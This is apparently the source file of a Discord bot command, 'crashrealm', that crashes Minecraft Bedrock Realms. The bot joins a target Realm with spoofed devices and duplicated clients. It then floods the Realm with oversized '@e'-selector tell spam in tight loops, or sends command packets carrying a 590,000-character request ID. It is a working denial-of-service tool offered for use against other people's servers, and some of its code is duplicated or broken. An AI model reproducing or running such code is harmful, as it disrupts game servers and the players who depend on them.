"use strict";

const devices = require("../../data/devices.json");
const { sendHoneyportAlert, translateKey, generateRandomString } = require("../../util.js");
const { getRealmData, getRealmAddress } = require("../../common/realms.js");
const { createBot, parseKickMessage, dupeClients, tpBot } = require("../../common/bp-dp.js");
const { userModel, realmModel, createRealmDefaults } = require("../../database.js");
// const { crash } = require("../../realm_crasher_main.js");

const check = "<:success:1170321325886287882>";
const cross = "<:error:1170321352587219024>";
const loading = "<a:loading:1170321149759074355>";
const none = ":black_circle:";

// has to be done on a later date or by someone else
const reply = "<:reply:1171524464761126942>";
const end = "<:end:1171524397840990269>";

let message = "";

for (let i = 0; i < 999999; i++) {
	message += "@e";
}

const realmCache = new Map();

module.exports = {
	name: "crashrealm",
	description: "crash a realm",
	options: [
		{
			type: 3,
			name: "code",
			description: "the realm code to join",
			required: true,
			min_length: 11,
			max_length: 11
		},
		{
			type: 4,
			name: "device_os",
			description: "the device to spoof as",
			required: true,
			choices: devices
		}
	],
	requireLink: true,
	cooldown: 5000,
	premiumCooldown: 3000,
	execute: async (interaction, args, dbUser) => {
		const { user } = interaction;
		const { code: realmCode, device_os } = args;

		const realmData = await getRealmData(realmCode, dbUser.didLink ? user.id : undefined);

		if (realmData.errorMsg) return interaction.createFollowup({ content: translateKey(dbUser.locale, "unableToGetRealmData", { error: realmData.errorMsg }) });

		if (realmData.honeypot && !dbUser.didLink) sendHoneyportAlert(interaction, realmCode);

		if (realmData.state === "CLOSED") return interaction.createFollowup({ content: translateKey(dbUser.locale, "realmClosed") });
		if (realmData.expired || realmData.expiredTrial) return interaction.createFollowup({ content: translateKey(dbUser.locale, "realmClosed") });

		let realm = await realmModel.findOne({ id: realmData.id });

		if (!realm) {
			realm = createRealmDefaults({
				id: realmData.id,
				name: realmData.name,
				realmCode: realmCode
			});
		}

		if (realm.realmCode !== realmCode && !realmCode.startsWith("=")) {
			realm.realmCode = realmCode;
		}

		if (realm.whitelisted) return interaction.createFollowup({ content: translateKey(dbUser.locale, "realmWhitelisted") });

		realmCache.set(realmCode, {
			id: realmData.id,
			name: realmData.name,
			totalCrashes: realm.totalCrashes
		});

		// delete realm cache after 3 minutes to save memory
		setTimeout(() => {
			realmCache.delete(realmCode);
		}, 180000);

		const embed = {
			title: translateKey(dbUser.locale, "realmCrasher"),
			timestamp: new Date(),
			color: 65280,
			description: translateKey(dbUser.locale, "selectCrashMethod"),
			footer: {
				text: `/crashrealm | Command used by ${user.username}`,
				icon_url: user.avatarURL
			}
		};

		interaction.createFollowup({
			embed: embed, components: [{
				type: 1,
				components: [
					{
						type: 3,
						custom_id: `{"a":"${realmCode}","b":${device_os}}`,
						options: [
							{
								label: "Type 1",
								value: 1,
								description: translateKey(dbUser.locale, "requiresLinkedAccount")
							},
							{
								label: "Type 2",
								value: 2,
								description: translateKey(dbUser.locale, "requiresLinkedAccount")
							}
						],
						placeholder: translateKey(dbUser.locale, "selectCrashMethodPlaceholder")
					}
				]
			}
		]
	});

		if (!realm.pendingCrashes) realm.pendingCrashes = 0;

		// realm.pendingCrashes += args.max_crashes ?? 1;
		realm.totalCrashes++;
		realm.save();
	},
	componentSelectEvent: selectedCrashButton
};

async function selectedCrashButton(interaction, custom_id) {
	// we edit the message so if the acknowledge fails it doesnt really matter
	interaction.acknowledge();

	const user = interaction.user;
	const dbUser = await userModel.findOne({ id: user.id });

	const { a: code, b: device_os } = JSON.parse(custom_id);

	// incase realm data isnt cached, we get the realm info
	// This makes it so we have to send one less network request
	const realmData = realmCache.get(code) ?? await getRealmData(code, dbUser.didLink ? user.id : undefined);

	realmData.device = device_os;

	const address = await getRealmAddress(code, dbUser.didLink ? user.id : undefined);

	const embed = interaction.message.embeds[0];
	if (address.errorMsg) {
		embed.color = 16729871;
		embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
			name: realmData.name,
			status1: check,
			status2: cross,
			status3: none,
			log: `${translateKey(dbUser.locale, "errorLog")}: ${address.errorMsg}`
		});
		return interaction.message.edit({ embed: embed, components: [] });
	}

	joinRealm(interaction, realmData, address, dbUser);
}

async function joinRealm(interaction, realm, address, dbUser) {
	const crashType = Number(interaction.data.values[0]);

	const embed = interaction.message.embeds[0];

	embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
		name: realm.name,
		status1: check,
		status2: loading,
		status3: none,
		log: ""
	});

	embed.footer = {
		text: translateKey(dbUser.locale, "crashFooter", { type: crashType, ...address })
	};

	interaction.message.edit({ embed: embed, components: [] });

	let interval;

	if (crashType === 1) {
		const client = createBot(address, realm.device, dbUser, false);

		client.on("play_status", (packet) => {
			if (packet.status !== "login_success") return;

			dupeClients(client, dbUser.skin);

			embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
				name: realm.name,
				status1: check,
				status2: check,
				status3: loading,
				log: ""
			});

			interaction.message.edit({ embed: embed });

            tpBot(client)

			interval = setInterval(() => {
				for (let i = 0; i < 100; i++) {
					client.sendCommand(`tell @a §l§c§k${"@e".repeat(120)} | .gg/antip2w`, 5);
					client.sendCommand2(`tell @a §l§c§k${"@e".repeat(120)} | .gg/antip2w`, 5);
					client.sendCommand3(`tell @a §l§c§k${"@e".repeat(120)} | .gg/antip2w`, 5);
					client.sendCommand4(`tell @a §l§c§k${"@e".repeat(120)} | .gg/antip2w`, 5);
				}
			}, 20)

			client.on("kick", (reason) => {
				embed.color = 16729871;
				embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
					name: realm.name,
					status1: check,
					status2: check,
					status3: cross,
					log: `${translateKey(dbUser.locale, "errorLog")}:\n${parseKickMessage(reason.message)}`
				});
		
				interaction.message.edit({ embed: embed });
			});

		setTimeout(() => {
			clearInterval(interval);
			client.disconnect();

			embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
				name: realm.name,
				status1: check,
				status2: check,
				status3: check,
				log: "Operation Complete."
			});

			interaction.message.edit({ embed: embed });
		}, 30 * 1000);
	})
  }

  if (crashType === 1) {
		const client = createBot(address, realm.device, dbUser, false);

		client.on("play_status", (packet) => {
			if (packet.status !== "login_success") return;

			dupeClients(client, dbUser.skin);

			embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
				name: realm.name,
				status1: check,
				status2: check,
				status3: loading,
				log: ""
			});

			interaction.message.edit({ embed: embed });

			interval = setInterval(() => {
				for (let i = 0; i < 100; i++) {
					client.sendCommand(`tell @a §l§c§k${"@e".repeat(120)} | .gg/antip2w`, 5);
					client.sendCommand2(`tell @a §l§c§k${"@e".repeat(120)} | .gg/antip2w`, 5);
					client.sendCommand3(`tell @a §l§c§k${"@e".repeat(120)} | .gg/antip2w`, 5);
					client.sendCommand4(`tell @a §l§c§k${"@e".repeat(120)} | .gg/antip2w`, 5);
				}
			}, 0)

			client.on("kick", (reason) => {
				embed.color = 16729871;
				embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
					name: realm.name,
					status1: check,
					status2: check,
					status3: cross,
					log: `${translateKey(dbUser.locale, "errorLog")}:\n${parseKickMessage(reason.message)}`
				});
		
				interaction.message.edit({ embed: embed });
			});

		setTimeout(() => {
			clearInterval(interval);
			client.disconnect();

			embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
				name: realm.name,
				status1: check,
				status2: check,
				status3: check,
				log: "Operation Complete."
			});

			interaction.message.edit({ embed: embed });
		}, 30 * 1000);
	})
  }
		if (crashType === 2) {
			const client = createBot(address, realm.device, dbUser);

			client.on("play_status", (packet) => {
				if (packet.status !== "login_success") return;

				embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
					name: realm.name,
					status1: check,
					status2: check,
					status3: loading,
					log: ""
				});

				interaction.message.edit({ embed: embed });

				let badData = generateRandomString(590000, "12345678901");

				interval = setInterval(() => {
					client.write("command_request", {
						command: "/tell @a hey!",
						origin: {
							type: source,
							uuid: "",
							request_id: badData
						},
						internal: false,
						version: 72
					});
				}, 0)

				client.on("kick", (reason) => {
					embed.color = 16729871;
					embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
						name: realm.name,
						status1: check,
						status2: check,
						status3: cross,
						log: `${translateKey(dbUser.locale, "errorLog")}:\n${parseKickMessage(reason.message)}`
					});
			
					interaction.message.edit({ embed: embed });
				});

			setTimeout(() => {
				clearInterval(interval);
				client.disconnect();

				embed.description = translateKey(dbUser.locale, "crashRealmStatus", {
					name: realm.name,
					status1: check,
					status2: check,
					status3: check,
					log: "Operation Complete."
				});

				interaction.message.edit({ embed: embed });
			}, 5 * 1000);
		})
	}
}
